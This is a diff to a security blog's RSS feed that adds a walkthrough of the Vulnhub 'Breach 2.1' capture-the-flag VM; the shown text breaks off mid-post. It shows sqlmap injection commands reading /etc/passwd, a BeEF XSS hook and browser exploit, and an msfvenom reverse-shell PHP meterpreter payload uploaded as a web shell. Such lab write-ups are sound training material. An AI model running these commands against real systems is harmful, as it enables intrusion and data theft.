@@ -8,16 +8,518 @@
     <language>en-us</language>
     <managingEditor>admin@camelinc.de</managingEditor>
     <webMaster>admin@camelinc.de</webMaster>
-    <copyright>Copyright (c) 2014 - 2016; all rights reserved.</copyright>
-    <lastBuildDate>Thu, 02 Mar 2017 10:46:59 +0000</lastBuildDate>
+    <copyright>Copyright (c) 2014 - 2017; all rights reserved.</copyright>
+    <lastBuildDate>Wed, 08 Mar 2017 22:22:59 +0000</lastBuildDate>
     <atom:link href="http://camelinc.info/post/index.xml" rel="self" type="application/rss+xml" />
     
     <item>
-      <title>Vulnhub - Breach 1 boot2root CTF walkthrough</title>
-      <link>http://camelinc.info/blog/2017/03/Vulnhub---Breach-1-boot2root-CTF-walkthrough/</link>
+      <title>Vulnhub - Breach 2.1 boot2root CTF walkthrough</title>
+      <link>http://camelinc.info/blog/2017/03/Vulnhub---Breach-2.1-boot2root-CTF-walkthrough/</link>
+      <pubDate>Wed, 08 Mar 2017 22:22:59 +0000</pubDate>
+      <author>admin@camelinc.de</author>
+      <guid>http://camelinc.info/blog/2017/03/Vulnhub---Breach-2.1-boot2root-CTF-walkthrough/</guid>
+      <description>
+
+&lt;h1 id=&#34;introduction&#34;&gt;Introduction&lt;/h1&gt;
+
+&lt;p&gt;Breach 2.1 is meant to be beginner to intermediate boot2root/CTF challenge.
+The VM is configured with a static IP address (192.168.110.151) so you will need to configure your host-only adaptor to this subnet.&lt;/p&gt;
+
+&lt;h1 id=&#34;information-gathering&#34;&gt;Information Gathering&lt;/h1&gt;
+
+&lt;p&gt;The VM is configured to the IP address 192.168.110.151.
+Let&amp;rsquo;s start by scanning the target via nmap.&lt;/p&gt;
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;$ nmap -n -Pn -sS -p- -sV -iL scope -v --open --script &lt;span class=&#34;s2&#34;&gt;&amp;quot;http-title or default&amp;quot;&lt;/span&gt; -oA target_&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;date &lt;span class=&#34;s2&#34;&gt;&amp;quot;+%Y-%m-%d&amp;quot;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;# Nmap 7.40 scan initiated Wed Mar  8 16:26:50 2017 as: nmap -n -Pn -sS -p- -sV -iL scope -v --open --script http-title or default -oA target_2017-03-08&lt;/span&gt;
+Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;192&lt;/span&gt;.168.110.151
+Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;.00011s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+Not shown: &lt;span class=&#34;m&#34;&gt;65532&lt;/span&gt; closed ports
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE VERSION
+&lt;span class=&#34;m&#34;&gt;111&lt;/span&gt;/tcp   open  rpcbind &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;-4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RPC &lt;span class=&#34;c1&#34;&gt;#100000)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; rpcinfo:
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   program version   port/proto  service
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;100000&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;,3,4        &lt;span class=&#34;m&#34;&gt;111&lt;/span&gt;/tcp  rpcbind
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;100000&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;,3,4        &lt;span class=&#34;m&#34;&gt;111&lt;/span&gt;/udp  rpcbind
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;100024&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;          &lt;span class=&#34;m&#34;&gt;51603&lt;/span&gt;/udp  status
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;100024&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;          &lt;span class=&#34;m&#34;&gt;54935&lt;/span&gt;/tcp  status
+&lt;span class=&#34;m&#34;&gt;54935&lt;/span&gt;/tcp open  status  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RPC &lt;span class=&#34;c1&#34;&gt;#100024)&lt;/span&gt;
+&lt;span class=&#34;m&#34;&gt;65535&lt;/span&gt;/tcp open  ssh     OpenSSH &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt;.7p1 Debian &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt;+deb8u2 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;protocol &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey:
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;1024&lt;/span&gt; f3:53:9a:0b:40:76:b1:02:87:3e:a5:7a:ae:85:9d:26 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;DSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; 9a:a8:db:78:4b:44:4f:fb:e5:83:6b:67:e3:ac:fb:f5 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; c1:63:f1:dc:8f:24:81:82:35:fa:88:1a:b8:73:40:24 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The one luring target is the ssh on port 65535/tcp.
+Let&amp;rsquo;s try and connect to it with &lt;code&gt;ssh 192.168.110.151 -p 65535&lt;/code&gt;.&lt;/p&gt;
+
+
+
+&lt;figure class=&#34;fcenter fmedium&#34;&gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-2_1/discovery-1_1.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;The ssh banner of Breach 2.1.&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-2_1/discovery-1_1.png&#34; alt=&#34;The ssh banner of Breach 2.1.&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+
+
+&lt;p&gt;So, that is a nice banner that encourages us to continue hacking.
+Also, the user &lt;code&gt;peter&lt;/code&gt; does get a password hint in the banner.
+The obvious password would be &lt;code&gt;in the source&lt;/code&gt; or maybe a variation.
+Let&amp;rsquo;s try these!&lt;/p&gt;
+
+
+
+&lt;figure class=&#34;fcenter fmedium&#34;&gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-2_1/service-1_0.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;The hint actually provided the password.&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-2_1/service-1_0.png&#34; alt=&#34;The hint actually provided the password.&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+
+
+&lt;p&gt;The password actually is &lt;code&gt;inthesource&lt;/code&gt;!
+Unfortunately, the ssh session is immediately closed by the server.
+The banner also mentions a blog that Peter is slacking on.
+Maybe we missed something, so better scan again and this time slowly.
+With &lt;code&gt;ndiff&lt;/code&gt; we can compare the results.&lt;/p&gt;
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;-Not shown: &lt;span class=&#34;m&#34;&gt;65532&lt;/span&gt; closed ports
++Not shown: &lt;span class=&#34;m&#34;&gt;65531&lt;/span&gt; closed ports
+ PORT   STATE SERVICE VERSION
++80/tcp open  http    Apache httpd &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;.4.10 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Debian&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
++&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  http-methods:
++&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_   Supported Methods: GET HEAD POST OPTIONS
++&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_ http-server-header: Apache/2.4.10 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Debian&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
++&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_ http-title: Initech Cyber Consulting, LLC
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;That is interesting, maybe the SSH login triggered the port to open?
+Let&amp;rsquo;s see for ourselves.&lt;/p&gt;
+
+
+
+&lt;figure class=&#34;fcenter fmedium&#34;&gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-2_1/website-1_0.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Looks like Milton left a comment.&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-2_1/website-1_0.png&#34; alt=&#34;Looks like Milton left a comment.&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+
+
+&lt;p&gt;The source code of the website might provide some additional pointers.&lt;/p&gt;
+
+
+
+&lt;figure class=&#34;fcenter&#34;&gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-2_1/website-1_1.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Nothing here.&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-2_1/website-1_1.png&#34; alt=&#34;Nothing here.&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+
+
+&lt;p&gt;Nothing here.
+Maybe we can find some files and directories on the web server via gobuster.&lt;/p&gt;
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; gobuster -u http://192.168.110.151 -w /usr/share/seclists/Discovery/Web_Content/raft-large-files.txt -e -r -l
+&lt;span class=&#34;go&#34;&gt;=====================================================&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;http://192.168.110.151/index.html (Status: 200) [Size: 468]&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;http://192.168.110.151/. (Status: 200) [Size: 468]&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;=====================================================&lt;/span&gt;
+&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; gobuster -u http://192.168.110.151 -w /usr/share/seclists/Discovery/Web_Content/raft-large-directories.txt -e -r -l -f
+&lt;span class=&#34;go&#34;&gt;=====================================================&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;http://192.168.110.151/blog/ (Status: 200) [Size: 5600]&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;=====================================================&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;There is Peter&amp;rsquo;s blog!
+What might be hidden behind this URL.&lt;/p&gt;
+
+
+
+&lt;figure class=&#34;fcenter fmedium&#34;&gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-2_1/website-2_0.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Peter&amp;#39;s Blog.&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-2_1/website-2_0.png&#34; alt=&#34;Peter&amp;#39;s Blog.&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+
+
+&lt;p&gt;This is not wordpress, it is rather a random php blogging application.
+Intuition automatically spawns an &lt;code&gt;sqlmap&lt;/code&gt; instance.&lt;/p&gt;
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; sqlmap --forms --batch --crawl &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; -u http://192.168.110.151/blog/index.php
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+
+
+&lt;figure class=&#34;fcenter&#34;&gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-2_1/website-2_1.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;sqlmap autospawns&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-2_1/website-2_1.png&#34; alt=&#34;sqlmap autospawns&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+
+
+&lt;p&gt;Ohlala, sqlmap quickly found a UNION based sql injection.
+What a surprise.
+Also, doing a search on exploitdb might also provide some quick wins or additional information.&lt;/p&gt;
+
+
+
+&lt;figure class=&#34;fcenter&#34;&gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-2_1/searchsploit-1_0.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Known exploits for blogphp&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-2_1/searchsploit-1_0.png&#34; alt=&#34;Known exploits for blogphp&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+
+
+&lt;p&gt;There exist a few know exploits.
+The SQL injection is already documented.
+Cross-Site Scripting is not relevant, as this does not help in exploiting the server.&lt;/p&gt;
+
+&lt;p&gt;Let&amp;rsquo;s take a close look at the MySQL database.
+There is an os-commerce database in the mysql server.&lt;/p&gt;
+
+
+
+&lt;figure class=&#34;fcenter fmedium&#34;&gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-2_1/oscommerce-1_0.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;oscommerce admin hash.&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-2_1/oscommerce-1_0.png&#34; alt=&#34;oscommerce admin hash.&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+
+
+&lt;p&gt;The admin password is only an md5 hashed password which can be quickly cracked.
+A search on the internet yields the cleartext password &lt;code&gt;32admin&lt;/code&gt;.
+Yet, on port 80 there is no os-commerce web shop.
+Let&amp;rsquo;s try to find out a little bit more about the system.
+First, let&amp;rsquo;s take a look at the user accounts of the system.&lt;/p&gt;
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; sqlmap --batch -u http://192.168.110.151/blog/index.php?search&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;asdf --file-read /etc/passwd
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;With the information from &lt;code&gt;/etc/passwd&lt;/code&gt; other possible attack vectors are to perform a brute-force attack on the ssh service.
+Also, the table blogphp_stats seems to contain a log of the web application.&lt;/p&gt;
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; sqlmap -u http://192.168.110.151/blog/index.php?search&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;asdf -D blog -T blogphp_stats --count --dump --stop &lt;span class=&#34;m&#34;&gt;99&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The most intriguing part is, that another IP address is also browsing the blog regularly.
+This might be Peter slacking at work!
+This is probably a hint for a client side attack.
+Thinking back to the searchsploit results, a few XSS vulnerabilities have been documented for the blog.&lt;/p&gt;
+
+&lt;p&gt;Based on 17640.txt the XSS provided during the startup of BeEF can be utilized in the attack.&lt;/p&gt;
+
+
+
+&lt;figure class=&#34;fcenter fmedium&#34;&gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-2_1/beef-1_2.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;The payload is sent to the web application.&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-2_1/beef-1_2.png&#34; alt=&#34;The payload is sent to the web application.&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+
+
+&lt;p&gt;So when Peter is browsing his blog and visits the members page the BeEF hook will execute and establish a connection to the control panel.
+After a minute or two a browser connects.&lt;/p&gt;
+
+
+
+&lt;figure class=&#34;fcenter fmedium&#34;&gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-2_1/beef-1_3.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Peter&amp;#39;s browser is connected to the control panel.&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-2_1/beef-1_3.png&#34; alt=&#34;Peter&amp;#39;s browser is connected to the control panel.&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+
+
+&lt;p&gt;Peter is using a pretty old version of Firefox.
+Searchsploit gives an overview and lists one metasploit module for this version of firefox.&lt;/p&gt;
+
+
+
+&lt;figure class=&#34;fcenter fmedium&#34;&gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-2_1/beef-2_0.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;The potential exploits for Peter&amp;#39;s browser.&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-2_1/beef-2_0.png&#34; alt=&#34;The potential exploits for Peter&amp;#39;s browser.&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+
+
+&lt;p&gt;So, open up metasploit and start the matching browser exploit.&lt;/p&gt;
+
+
+
+&lt;figure class=&#34;fcenter fmedium&#34;&gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-2_1/beef-2_1.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;The exploit server is running and ready for target connections.&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-2_1/beef-2_1.png&#34; alt=&#34;The exploit server is running and ready for target connections.&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+
+
+&lt;p&gt;After starting the exploit server the client has to be redirected in order to exploit the browser.
+This can be achieved in multiple ways in BeEF.&lt;/p&gt;
+
+
+
+&lt;figure class=&#34;fcenter fmedium&#34;&gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-2_1/beef-2_2.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Opening an iFrame with a link to the exploit server.&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-2_1/beef-2_2.png&#34; alt=&#34;Opening an iFrame with a link to the exploit server.&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+
+
+&lt;p&gt;After a few seconds a shell connection is established.&lt;/p&gt;
+
+
+
+&lt;figure class=&#34;fcenter fmedium&#34;&gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-2_1/beef-2_3.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;The established session with user information.&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-2_1/beef-2_3.png&#34; alt=&#34;The established session with user information.&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+
+
+&lt;p&gt;Shell is good, meterpreter is better.
+With &lt;code&gt;post/multi/manage/shell_to_meterpreter&lt;/code&gt; the session can be upgraded.&lt;/p&gt;
+
+
+
+&lt;figure class=&#34;fcenter fmedium&#34;&gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-2_1/beef-2_4.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;The meterpreter session is established.&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-2_1/beef-2_4.png&#34; alt=&#34;The meterpreter session is established.&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+
+
+&lt;p&gt;Finally on the system.
+What next?
+Running post exploitation scripts to gather additional information might provide a next hint.
+Netstat list the localhost:2323 as open.
+Let&amp;rsquo;s find out what is waiting there for us.&lt;/p&gt;
+
+
+
+&lt;figure class=&#34;fcenter fmedium&#34;&gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-2_1/telnet-1_0.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;The service responds with coordinates.&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-2_1/telnet-1_0.png&#34; alt=&#34;The service responds with coordinates.&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+
+
+&lt;p&gt;The service banner includes only a set of coordinates.
+A quick search on the internet provides a pin on the map.&lt;/p&gt;
+
+
+
+&lt;figure class=&#34;fcenter fmedium&#34;&gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-2_1/telnet-1_1.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;The position on a map.&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-2_1/telnet-1_1.png&#34; alt=&#34;The position on a map.&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+
+
+&lt;p&gt;Houston it is.
+Trying some username and password combinations based on the user accounts on the box.&lt;/p&gt;
+
+
+
+&lt;figure class=&#34;fcenter fmedium&#34;&gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-2_1/telnet-1_2.png&#34; data-lightbox=&#34;default&#34;  &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-2_1/telnet-1_2.png&#34;  &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+
+
+&lt;p&gt;So, &amp;ldquo;Whose stapler is it?&amp;rdquo; is more like trick question.
+Looking back at Milton&amp;rsquo;s best scenes the answer is quite obvious.&lt;/p&gt;
+
+
+&lt;div style=&#34;position: relative; padding-bottom: 56.25%; padding-top: 30px; height: 0; overflow: hidden;&#34;&gt;
+  &lt;iframe src=&#34;//www.youtube.com/embed/pHHZBmF8mk4&#34; style=&#34;position: absolute; top: 0; left: 0; width: 100%; height: 100%;&#34; allowfullscreen frameborder=&#34;0&#34;&gt;&lt;/iframe&gt;
+ &lt;/div&gt;
+
+
+&lt;p&gt;After the login nothing happens.
+Let&amp;rsquo;s check the running services, maybe another one is activated after a successful login.
+After a quick nmap scan we can compare the results and check for changes.&lt;/p&gt;
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;192&lt;/span&gt;.168.110.151, &lt;span class=&#34;m&#34;&gt;08&lt;/span&gt;:00:27:B0:12:49:
+-Not shown: &lt;span class=&#34;m&#34;&gt;65531&lt;/span&gt; closed ports
++Not shown: &lt;span class=&#34;m&#34;&gt;65529&lt;/span&gt; closed ports
+PORT      STATE SERVICE VERSION
++8888/tcp  open  http    nginx &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;.6.2
++&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  http-ls: Volume /
++&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  SIZE  TIME               FILENAME
++&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  -     &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt;-Jun-2016 &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt;:50  oscommerce/
++&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;867&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt;-Jun-2016 &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt;:09  index.nginx-debian.html
++&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_
++&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  http-methods:
++&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_   Supported Methods: GET HEAD POST
++&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_ http-server-header: nginx/1.6.2
++&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_ http-title: Index of /
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;There is another web service available.
+This time even with oscommerce.
+The administrative interface for oscommerce is hosted at &lt;code&gt;/admin&lt;/code&gt;.
+Luckily, the login credentials for the &lt;code&gt;admin&lt;/code&gt; user have already been compromised via sqlmap.
+The hash corresponds to the password &lt;code&gt;32admin&lt;/code&gt;.
+However, this password did not work.
+However, trying the default combination admin:admin did grant access to the administrative interface.&lt;/p&gt;
+
+&lt;p&gt;With access to the file manager uploading a php shell would be possible.
+We have a winner.
+Just quickly create a meterpreter php payload that can be uploaded to the web server.&lt;/p&gt;
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;# msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.110.5 LPORT=4444 -f raw -o meterpreter.php&lt;/span&gt;
+No platform was selected, choosing Msf::Module::Platform::PHP from the payload
+No Arch selected, selecting Arch: php from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: &lt;span class=&#34;m&#34;&gt;949&lt;/span&gt; bytes
+Saved as: meterpreter.php
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;As none of the root folders is writeable there might be one in a subdirectory.
+With some command line kungfu a suitable directory can easily be found.&lt;/p&gt;
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;$ find /var/www/html2/oscommerce -perm /o&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;w
+/var/www/html2/oscommerce/includes/work
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The web shell can be executed by simply browsing to the file.&lt;/p&gt;
+
+
+
+&lt;figure class=&#34;fcenter fmedium&#34;&gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-2_1/stage3-1_2.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;The meterpreter payload is waiting to be executed.&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-2_1/stage3-1_2.png&#34; alt=&#34;The meterpreter payload is waiting to be executed.&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+
+
+&lt;p&gt;After opening the payload in the browser the meterpreter connects back to the handler.&lt;/p&gt;
+
+
+
+&lt;figure class=&#34;fcenter fmedium&#34;&gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-2_1/stage3-1_3.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;The reverse shell connects back to the handler.&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-2_1/stage3-1_3.png&#34; alt=&#34;The reverse shell connects back to the handler.&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+
+
+&lt;p&gt;Shells spawned from the meterpreter session are lacking the tty.
+A quick fix is to start one with the following python one liner.&lt;/p&gt;
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;python -c &lt;span class=&#34;s2&#34;&gt;&amp;quot;import pty; pty.spawn(&amp;#39;/bin/bash&amp;#39;)&amp;quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Already having gathered relevant information about the system there might be some user specific security issue.
+Listing the sudo rights for the users brings one allowed command.&lt;/p&gt;
+
+
+
+&lt;figure class=&#34;fcenter fmedium&#34;&gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-2_1/stage3-1_4.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;The sudo rights of blumbergh.&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-2_1/stage3-1_4.png&#34; alt=&#34;The sudo rights of blumbergh.&#34; &gt;
+    &lt;/a&gt;
